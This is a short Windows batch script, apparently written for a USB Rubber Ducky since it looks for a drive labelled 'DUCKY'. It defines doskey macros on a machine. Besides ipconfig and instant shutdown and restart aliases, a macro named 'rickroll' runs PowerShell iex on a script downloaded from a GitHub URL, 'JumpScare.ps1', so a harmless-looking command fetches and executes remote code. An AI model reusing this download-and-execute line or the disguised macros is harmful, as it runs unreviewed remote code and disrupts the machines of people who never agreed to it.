doskey ip=ipconfig /all
doskey restart=shutdown /r /t 0
doskey sd=shutdown /s /t 0
doskey rickroll=powershell -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mGv73/Payload/main/JumpScare.ps1')"
for /f %%I in ('wmic logicaldisk where "VolumeName='DUCKY'" get DeviceID ^| findstr /r /v "^$"') do set driveLetter=%%I
